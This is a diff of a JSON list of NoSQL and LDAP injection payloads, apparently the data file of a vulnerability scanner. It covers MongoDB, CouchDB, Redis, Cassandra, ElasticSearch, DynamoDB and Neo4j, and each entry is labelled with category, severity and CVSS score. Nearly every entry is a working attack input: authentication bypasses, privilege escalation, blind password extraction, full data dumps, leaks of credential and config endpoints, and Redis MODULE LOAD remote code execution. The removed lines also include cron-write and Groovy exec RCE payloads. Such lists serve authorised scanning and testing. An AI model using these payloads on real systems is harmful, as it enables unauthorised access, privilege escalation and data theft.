@@ -1,56 +1,653 @@
 [
-  {"engine": "MongoDB",   "payload": "{\"$ne\": null}",                                          "category": "auth-bypass",      "severity": "CRITICAL", "cvss": 9.1,  "name": "MongoDB $ne null auth bypass",                       "transport": "json"},
-  {"engine": "MongoDB",   "payload": "{\"$ne\": \"\"}",                                          "category": "auth-bypass",      "severity": "CRITICAL", "cvss": 9.1,  "name": "MongoDB $ne empty auth bypass",                      "transport": "json"},
-  {"engine": "MongoDB",   "payload": "{\"$gt\": \"\"}",                                          "category": "auth-bypass",      "severity": "CRITICAL", "cvss": 9.1,  "name": "MongoDB $gt empty auth bypass",                      "transport": "json"},
-  {"engine": "MongoDB",   "payload": "{\"$exists\": true}",                                      "category": "auth-bypass",      "severity": "HIGH",     "cvss": 8.0,  "name": "MongoDB $exists true",                               "transport": "json"},
-  {"engine": "MongoDB",   "payload": "{\"$regex\": \".*\"}",                                     "category": "auth-bypass",      "severity": "HIGH",     "cvss": 8.0,  "name": "MongoDB $regex wildcard",                            "transport": "json"},
-  {"engine": "MongoDB",   "payload": "{\"$or\": [{\"a\":\"a\"},{\"b\":\"b\"}]}",                 "category": "auth-bypass",      "severity": "HIGH",     "cvss": 8.0,  "name": "MongoDB $or tautology",                              "transport": "json"},
-  {"engine": "MongoDB",   "payload": "{\"$nin\": [\"\"]}",                                       "category": "auth-bypass",      "severity": "HIGH",     "cvss": 8.0,  "name": "MongoDB $nin empty bypass",                          "transport": "json"},
-  {"engine": "MongoDB",   "payload": "{\"$in\": [\"admin\",\"administrator\",\"root\"]}",        "category": "auth-bypass",      "severity": "HIGH",     "cvss": 7.5,  "name": "MongoDB $in privileged users",                        "transport": "json"},
-  {"engine": "MongoDB",   "payload": "username[$ne]=&password[$ne]=",                            "category": "auth-bypass",      "severity": "CRITICAL", "cvss": 9.1,  "name": "MongoDB $ne URL-encoded form bypass",                "transport": "form"},
-  {"engine": "MongoDB",   "payload": "username[$regex]=^admin&password[$ne]=",                   "category": "auth-bypass",      "severity": "CRITICAL", "cvss": 9.1,  "name": "MongoDB regex admin + ne password bypass",           "transport": "form"},
-  {"engine": "MongoDB",   "payload": "username[$gt]=&password[$gt]=",                            "category": "auth-bypass",      "severity": "CRITICAL", "cvss": 9.1,  "name": "MongoDB $gt empty form bypass",                      "transport": "form"},
-  {"engine": "MongoDB",   "payload": "username[$exists]=true&password[$exists]=true",            "category": "auth-bypass",      "severity": "HIGH",     "cvss": 7.5,  "name": "MongoDB $exists form bypass",                        "transport": "form"},
-  {"engine": "MongoDB",   "payload": "{\"$where\": \"sleep(5000)\"}",                            "category": "time-injection",   "severity": "CRITICAL", "cvss": 9.0,  "name": "MongoDB $where sleep — confirms NoSQLi via timing",   "transport": "json", "timing": 5},
-  {"engine": "MongoDB",   "payload": "{\"$where\": \"this.x == this.x\"}",                       "category": "where-tautology",  "severity": "HIGH",     "cvss": 8.0,  "name": "MongoDB $where always-true",                         "transport": "json"},
-  {"engine": "MongoDB",   "payload": "{\"$where\": \"function(){var d=new Date();do{cd=new Date();}while(cd-d<5000);return true;}\"}", "category": "time-injection", "severity": "CRITICAL", "cvss": 9.0, "name": "MongoDB $where JS busy-loop timing", "transport": "json", "timing": 5},
-  {"engine": "MongoDB",   "payload": "';return(true);var x='",                                    "category": "string-break",     "severity": "HIGH",     "cvss": 7.5,  "name": "MongoDB JS string-break tautology",                  "transport": "string"},
-  {"engine": "MongoDB",   "payload": "{\"$where\": \"this.password.match(/.*/)\"}",              "category": "blind-extract",    "severity": "HIGH",     "cvss": 8.0,  "name": "MongoDB $where regex char-extract",                  "transport": "json"},
-  {"engine": "MongoDB",   "payload": "1;return 1;//",                                            "category": "string-break",     "severity": "HIGH",     "cvss": 7.5,  "name": "MongoDB integer-context break",                      "transport": "string"},
-  {"engine": "MongoDB",   "payload": "{\"$expr\": {\"$gt\": [\"$balance\", 0]}}",                "category": "logic-bypass",     "severity": "HIGH",     "cvss": 7.5,  "name": "MongoDB $expr field comparison bypass",              "transport": "json"},
-  {"engine": "MongoDB",   "payload": "{\"$lookup\": {\"from\": \"users\", \"localField\": \"_id\", \"foreignField\": \"_id\", \"as\": \"x\"}}", "category": "info-disclosure", "severity": "HIGH", "cvss": 7.5, "name": "MongoDB $lookup cross-collection leak", "transport": "json"},
-  {"engine": "MongoDB",   "payload": "{\"username\": \"admin\", \"$where\": \"1==1\"}",          "category": "auth-bypass",      "severity": "CRITICAL", "cvss": 9.0,  "name": "MongoDB mixed param + $where",                       "transport": "json"},
-  {"engine": "MongoDB",   "payload": "{\"username\": {\"$ne\": null}, \"isAdmin\": true}",      "category": "privilege-escalation", "severity": "CRITICAL", "cvss": 9.5, "name": "MongoDB isAdmin privilege escalation",          "transport": "json"},
-  {"engine": "MongoDB",   "payload": "{\"role\": {\"$in\": [\"admin\", \"superuser\", \"root\"]}}", "category": "privilege-escalation", "severity": "CRITICAL", "cvss": 9.0, "name": "MongoDB role escalation $in",                "transport": "json"},
-  {"engine": "MongoDB",   "payload": "{\"$comment\": \"mongoinj\"}",                              "category": "detect",           "severity": "LOW",      "cvss": 3.0,  "name": "MongoDB $comment probe — no-op confirms operator parsing", "transport": "json"},
-
-  {"engine": "CouchDB",   "payload": "{\"selector\": {\"_id\": {\"$gt\": null}}}",               "category": "data-exfil",       "severity": "HIGH",     "cvss": 8.5,  "name": "CouchDB Mango selector dump-all",                    "transport": "json"},
-  {"engine": "CouchDB",   "payload": "/_users/_all_docs?include_docs=true",                      "category": "info-disclosure",  "severity": "CRITICAL", "cvss": 9.5,  "name": "CouchDB _users database enumeration",                "transport": "url"},
-  {"engine": "CouchDB",   "payload": "/_all_dbs",                                                "category": "info-disclosure",  "severity": "HIGH",     "cvss": 7.5,  "name": "CouchDB _all_dbs enumeration",                       "transport": "url"},
-  {"engine": "CouchDB",   "payload": "/_config",                                                 "category": "config-leak",      "severity": "CRITICAL", "cvss": 9.0,  "name": "CouchDB _config disclosure",                         "transport": "url"},
-  {"engine": "CouchDB",   "payload": "/_membership",                                             "category": "info-disclosure",  "severity": "MEDIUM",   "cvss": 5.5,  "name": "CouchDB cluster membership leak",                    "transport": "url"},
-
-  {"engine": "Redis",     "payload": "*3\\r\\n$3\\r\\nset\\r\\n$3\\r\\nfoo\\r\\n$3\\r\\nbar\\r\\n", "category": "command-injection", "severity": "CRITICAL", "cvss": 9.0, "name": "Redis SET via RESP — CRLF injection",            "transport": "raw"},
-  {"engine": "Redis",     "payload": "CONFIG GET *",                                              "category": "config-leak",      "severity": "CRITICAL", "cvss": 9.0,  "name": "Redis CONFIG GET full leak",                         "transport": "redis"},
-  {"engine": "Redis",     "payload": "CONFIG SET dir /var/spool/cron/",                          "category": "rce-cronjob",      "severity": "CRITICAL", "cvss": 9.8,  "name": "Redis cron-write RCE primitive (dir change)",        "transport": "redis"},
-  {"engine": "Redis",     "payload": "EVAL 'return redis.call(\"GET\", KEYS[1])' 1 secret",       "category": "lua-eval",         "severity": "HIGH",     "cvss": 8.0,  "name": "Redis Lua EVAL key extraction",                      "transport": "redis"},
-  {"engine": "Redis",     "payload": "MODULE LOAD /tmp/exploit.so",                              "category": "rce-module",       "severity": "CRITICAL", "cvss": 9.8,  "name": "Redis MODULE LOAD RCE",                              "transport": "redis"},
-
-  {"engine": "Cassandra", "payload": "' OR '1'='1",                                              "category": "cql-injection",    "severity": "HIGH",     "cvss": 8.0,  "name": "Cassandra CQL OR-tautology",                         "transport": "cql"},
-  {"engine": "Cassandra", "payload": "' AND token(id) > token(0) ALLOW FILTERING --",            "category": "data-exfil",       "severity": "HIGH",     "cvss": 7.5,  "name": "Cassandra ALLOW FILTERING dump",                     "transport": "cql"},
-
-  {"engine": "ElasticSearch", "payload": "{\"query\": {\"match_all\": {}}}",                     "category": "data-exfil",       "severity": "HIGH",     "cvss": 7.5,  "name": "ElasticSearch match_all dump",                       "transport": "json"},
-  {"engine": "ElasticSearch", "payload": "{\"script_fields\": {\"x\": {\"script\": {\"lang\":\"groovy\",\"source\":\"java.lang.Runtime.getRuntime().exec('id').toString()\"}}}}", "category": "rce-script", "severity": "CRITICAL", "cvss": 9.8, "name": "ElasticSearch Groovy script RCE", "transport": "json"},
-  {"engine": "ElasticSearch", "payload": "/_cat/indices",                                         "category": "info-disclosure",  "severity": "MEDIUM",   "cvss": 5.5,  "name": "ElasticSearch indices enumeration",                  "transport": "url"},
-  {"engine": "ElasticSearch", "payload": "/_cluster/state",                                       "category": "config-leak",      "severity": "HIGH",     "cvss": 7.5,  "name": "ElasticSearch cluster state leak",                   "transport": "url"},
-
-  {"engine": "DynamoDB",  "payload": "{\"FilterExpression\": \"begins_with(#id, :p)\", \"ExpressionAttributeValues\": {\":p\": {\"S\": \"\"}}}", "category": "data-exfil", "severity": "HIGH", "cvss": 7.5, "name": "DynamoDB begins_with empty-prefix dump", "transport": "json"},
-
-  {"engine": "Neo4j",     "payload": "' OR 1=1 //",                                              "category": "cypher-injection", "severity": "HIGH",     "cvss": 8.0,  "name": "Neo4j Cypher OR-tautology",                          "transport": "cypher"},
-  {"engine": "Neo4j",     "payload": "1 RETURN apoc.util.sleep(5000) //",                        "category": "time-injection",   "severity": "CRITICAL", "cvss": 9.0,  "name": "Neo4j APOC sleep timing",                            "transport": "cypher", "timing": 5},
-  {"engine": "Neo4j",     "payload": "1 CALL dbms.procedures() YIELD name RETURN name LIMIT 50", "category": "info-disclosure",  "severity": "HIGH",     "cvss": 7.5,  "name": "Neo4j dbms.procedures enumeration",                  "transport": "cypher"},
-
-  {"engine": "Universal", "payload": "{\"username\": {\"$ne\": 1}, \"password\": {\"$ne\": 1}}", "category": "detect",           "severity": "HIGH",     "cvss": 7.5,  "name": "Universal operator-injection probe — confirms JSON parsing", "transport": "json"},
-  {"engine": "Universal", "payload": "true, true",                                                "category": "type-juggle",      "severity": "MEDIUM",   "cvss": 5.5,  "name": "Universal boolean coercion probe",                   "transport": "string"},
-  {"engine": "Universal", "payload": "[]",                                                        "category": "type-juggle",      "severity": "MEDIUM",   "cvss": 5.0,  "name": "Universal empty-array coercion",                     "transport": "json"}
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$ne\": null}",
+    "category": "auth-bypass",
+    "severity": "CRITICAL",
+    "cvss": 9.1,
+    "name": "MongoDB $ne null auth bypass",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$ne\": \"\"}",
+    "category": "auth-bypass",
+    "severity": "CRITICAL",
+    "cvss": 9.1,
+    "name": "MongoDB $ne empty auth bypass",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$ne\": 1}",
+    "category": "auth-bypass",
+    "severity": "CRITICAL",
+    "cvss": 9.1,
+    "name": "MongoDB $ne integer auth bypass",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$gt\": \"\"}",
+    "category": "auth-bypass",
+    "severity": "CRITICAL",
+    "cvss": 9.1,
+    "name": "MongoDB $gt empty auth bypass",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$gte\": \"\"}",
+    "category": "auth-bypass",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "MongoDB $gte empty auth bypass",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$lt\": \"~\"}",
+    "category": "auth-bypass",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "MongoDB $lt tilde auth bypass",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$exists\": true}",
+    "category": "auth-bypass",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "MongoDB $exists true",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$regex\": \".*\"}",
+    "category": "auth-bypass",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "MongoDB $regex wildcard",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$regex\": \"^a\"}",
+    "category": "auth-bypass",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "MongoDB $regex prefix bypass",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$regex\": \"^.{0,}\"}",
+    "category": "auth-bypass",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "MongoDB $regex any-length bypass",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$nin\": [\"\"]}",
+    "category": "auth-bypass",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "MongoDB $nin empty bypass",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$in\": [\"admin\", \"administrator\", \"root\"]}",
+    "category": "auth-bypass",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "MongoDB $in privileged users",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$or\": [{\"a\": \"a\"}, {\"b\": \"b\"}]}",
+    "category": "auth-bypass",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "MongoDB $or tautology",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$not\": {\"$eq\": \"neverthisvalue\"}}",
+    "category": "auth-bypass",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "MongoDB $not negation bypass",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$where\": \"1==1\"}",
+    "category": "auth-bypass",
+    "severity": "CRITICAL",
+    "cvss": 9.0,
+    "name": "MongoDB $where always-true auth bypass",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$where\": \"return true\"}",
+    "category": "auth-bypass",
+    "severity": "CRITICAL",
+    "cvss": 9.0,
+    "name": "MongoDB $where return-true bypass",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$comment\": \"x\", \"$ne\": null}",
+    "category": "auth-bypass",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "MongoDB $comment + $ne combo",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"username\": {\"$ne\": null}, \"isAdmin\": true}",
+    "category": "privilege-escalation",
+    "severity": "CRITICAL",
+    "cvss": 9.5,
+    "name": "MongoDB isAdmin privilege escalation",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"role\": {\"$in\": [\"admin\", \"superuser\", \"root\"]}}",
+    "category": "privilege-escalation",
+    "severity": "CRITICAL",
+    "cvss": 9.0,
+    "name": "MongoDB role escalation $in",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$set\": {\"role\": \"admin\"}}",
+    "category": "privilege-escalation",
+    "severity": "CRITICAL",
+    "cvss": 9.5,
+    "name": "MongoDB $set role escalation",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"isAdmin\": {\"$ne\": false}}",
+    "category": "privilege-escalation",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "MongoDB isAdmin negation escalation",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"permissions\": {\"$exists\": true}}",
+    "category": "privilege-escalation",
+    "severity": "MEDIUM",
+    "cvss": 5.5,
+    "name": "MongoDB permissions field probe",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$gt\": \"\"}",
+    "category": "data-exfil",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "MongoDB $gt dump-all review",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$ne\": \"neverthisvalue\"}",
+    "category": "data-exfil",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "MongoDB $ne dump-all review",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$regex\": \".*\"}",
+    "category": "data-exfil",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "MongoDB $regex dump-all review",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$exists\": true}",
+    "category": "data-exfil",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "MongoDB $exists dump-all review",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$nin\": []}",
+    "category": "data-exfil",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "MongoDB $nin empty-array dump",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$where\": \"this.x == this.x\"}",
+    "category": "where-tautology",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "MongoDB $where always-true tautology",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$where\": \"true\"}",
+    "category": "where-tautology",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "MongoDB $where literal-true tautology",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$where\": \"1\"}",
+    "category": "where-tautology",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "MongoDB $where truthy tautology",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$where\": \"Object.keys(this).length >= 0\"}",
+    "category": "where-tautology",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "MongoDB $where keys tautology",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$expr\": {\"$gt\": [\"$balance\", -1]}}",
+    "category": "data-exfil",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "MongoDB $expr always-true exfil",
+    "transport": "json"
+  },
+  {
+    "engine": "Universal",
+    "payload": "{\"username\": {\"$ne\": 1}, \"password\": {\"$ne\": 1}}",
+    "category": "auth-bypass",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "Universal operator-injection probe",
+    "transport": "json"
+  },
+  {
+    "engine": "Universal",
+    "payload": "{\"$ne\": null}",
+    "category": "auth-bypass",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "Universal $ne null probe",
+    "transport": "json"
+  },
+  {
+    "engine": "Universal",
+    "payload": "{\"$gt\": \"\"}",
+    "category": "data-exfil",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "Universal $gt dump probe",
+    "transport": "json"
+  },
+  {
+    "engine": "Universal",
+    "payload": "{\"$or\": [{}]}",
+    "category": "where-tautology",
+    "severity": "MEDIUM",
+    "cvss": 6.0,
+    "name": "Universal $or-empty tautology",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$where\": \"sleep(5000)\"}",
+    "category": "time-injection",
+    "severity": "CRITICAL",
+    "cvss": 9.0,
+    "name": "MongoDB $where sleep timing",
+    "transport": "json",
+    "timing": 5
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$where\": \"function(){var d=new Date();do{var c=new Date();}while(c-d<5000);return true;}\"}",
+    "category": "time-injection",
+    "severity": "CRITICAL",
+    "cvss": 9.0,
+    "name": "MongoDB $where busy-loop timing",
+    "transport": "json",
+    "timing": 5
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$where\": \"this.a==this.a && sleep(5000)\"}",
+    "category": "time-injection",
+    "severity": "CRITICAL",
+    "cvss": 9.0,
+    "name": "MongoDB $where conditional sleep",
+    "transport": "json",
+    "timing": 5
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$regex\": \"^a.*\"}",
+    "category": "blind-extract",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "MongoDB blind regex char[0]=a",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$regex\": \"^.{8}$\"}",
+    "category": "blind-extract",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "MongoDB blind length=8 probe",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$where\": \"this.password.match(/^a/)\"}",
+    "category": "blind-extract",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "MongoDB $where regex char-extract",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$where\": \"this.password[0]==\\u0027a\\u0027\"}",
+    "category": "blind-extract",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "MongoDB $where index char-extract",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "username[$ne]=&password[$ne]=",
+    "category": "auth-bypass",
+    "severity": "CRITICAL",
+    "cvss": 9.1,
+    "name": "MongoDB $ne URL-encoded form bypass",
+    "transport": "form"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "username[$gt]=&password[$gt]=",
+    "category": "auth-bypass",
+    "severity": "CRITICAL",
+    "cvss": 9.1,
+    "name": "MongoDB $gt empty form bypass",
+    "transport": "form"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "username[$regex]=^admin&password[$ne]=",
+    "category": "auth-bypass",
+    "severity": "CRITICAL",
+    "cvss": 9.1,
+    "name": "MongoDB regex admin + ne password",
+    "transport": "form"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "username[$exists]=true&password[$exists]=true",
+    "category": "auth-bypass",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "MongoDB $exists form bypass",
+    "transport": "form"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "username[$in][]=admin&password[$ne]=",
+    "category": "auth-bypass",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "MongoDB $in admin form bypass",
+    "transport": "form"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "user[$nin][]=&pass[$nin][]=",
+    "category": "auth-bypass",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "MongoDB $nin empty form bypass",
+    "transport": "form"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "';return(true);var x='",
+    "category": "string-break",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "MongoDB JS string-break tautology",
+    "transport": "string"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "1;return 1;//",
+    "category": "string-break",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "MongoDB integer-context break",
+    "transport": "string"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "'||'1'=='1",
+    "category": "string-break",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "MongoDB JS OR-tautology",
+    "transport": "string"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "a';sleep(5000);'",
+    "category": "string-break",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "MongoDB string-break sleep",
+    "transport": "string"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$comment\": \"vlnosql\"}",
+    "category": "detect",
+    "severity": "LOW",
+    "cvss": 3.0,
+    "name": "MongoDB $comment no-op detect probe",
+    "transport": "json"
+  },
+  {
+    "engine": "MongoDB",
+    "payload": "{\"$type\": \"string\"}",
+    "category": "detect",
+    "severity": "LOW",
+    "cvss": 3.0,
+    "name": "MongoDB $type operator detect probe",
+    "transport": "json"
+  },
+  {
+    "engine": "CouchDB",
+    "payload": "{\"selector\": {\"_id\": {\"$gt\": null}}}",
+    "category": "data-exfil",
+    "severity": "HIGH",
+    "cvss": 8.5,
+    "name": "CouchDB Mango selector dump-all",
+    "transport": "json"
+  },
+  {
+    "engine": "CouchDB",
+    "payload": "/_users/_all_docs?include_docs=true",
+    "category": "info-disclosure",
+    "severity": "CRITICAL",
+    "cvss": 9.5,
+    "name": "CouchDB _users enumeration",
+    "transport": "url"
+  },
+  {
+    "engine": "CouchDB",
+    "payload": "/_all_dbs",
+    "category": "info-disclosure",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "CouchDB _all_dbs enumeration",
+    "transport": "url"
+  },
+  {
+    "engine": "CouchDB",
+    "payload": "/_config",
+    "category": "config-leak",
+    "severity": "CRITICAL",
+    "cvss": 9.0,
+    "name": "CouchDB _config disclosure",
+    "transport": "url"
+  },
+  {
+    "engine": "Redis",
+    "payload": "CONFIG GET *",
+    "category": "config-leak",
+    "severity": "CRITICAL",
+    "cvss": 9.0,
+    "name": "Redis CONFIG GET full leak",
+    "transport": "redis"
+  },
+  {
+    "engine": "Redis",
+    "payload": "EVAL 'return redis.call(\"GET\", KEYS[1])' 1 secret",
+    "category": "lua-eval",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "Redis Lua EVAL key extraction",
+    "transport": "redis"
+  },
+  {
+    "engine": "Redis",
+    "payload": "MODULE LOAD /tmp/exploit.so",
+    "category": "rce-module",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Redis MODULE LOAD RCE",
+    "transport": "redis"
+  },
+  {
+    "engine": "Cassandra",
+    "payload": "' OR '1'='1",
+    "category": "cql-injection",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "Cassandra CQL OR-tautology",
+    "transport": "cql"
+  },
+  {
+    "engine": "Cassandra",
+    "payload": "' AND token(id) > token(0) ALLOW FILTERING --",
+    "category": "data-exfil",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "Cassandra ALLOW FILTERING dump",
+    "transport": "cql"
+  },
+  {
+    "engine": "ElasticSearch",
+    "payload": "{\"query\": {\"match_all\": {}}}",
+    "category": "data-exfil",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "ElasticSearch match_all dump",
+    "transport": "json"
+  },
+  {
+    "engine": "ElasticSearch",
+    "payload": "/_cat/indices",
+    "category": "info-disclosure",
+    "severity": "MEDIUM",
+    "cvss": 5.5,
+    "name": "ElasticSearch indices enumeration",
+    "transport": "url"
+  },
+  {
+    "engine": "ElasticSearch",
+    "payload": "/_cluster/state",
+    "category": "config-leak",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "ElasticSearch cluster state leak",
+    "transport": "url"
+  },
+  {
+    "engine": "Neo4j",
+    "payload": "' OR 1=1 //",
+    "category": "cypher-injection",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "Neo4j Cypher OR-tautology",
+    "transport": "cypher"
+  },
+  {
+    "engine": "Neo4j",
+    "payload": "1 CALL dbms.procedures() YIELD name RETURN name LIMIT 50",
+    "category": "info-disclosure",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "Neo4j dbms.procedures enumeration",
+    "transport": "cypher"
+  },
+  {
+    "engine": "DynamoDB",
+    "payload": "{\"FilterExpression\": \"begins_with(#id, :p)\", \"ExpressionAttributeValues\": {\":p\": {\"S\": \"\"}}}",
+    "category": "data-exfil",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "DynamoDB begins_with empty-prefix dump",
+    "transport": "json"
+  },
+  {
+    "engine": "LDAP",
+    "payload": "*)(uid=*))(|(uid=*",
+    "category": "ldap-injection",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "LDAP filter wildcard injection",
+    "transport": "ldap"
+  },
+  {
+    "engine": "LDAP",
+    "payload": "*)(|(password=*))",
+    "category": "ldap-injection",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "LDAP password disclosure filter",
+    "transport": "ldap"
+  }
 ]
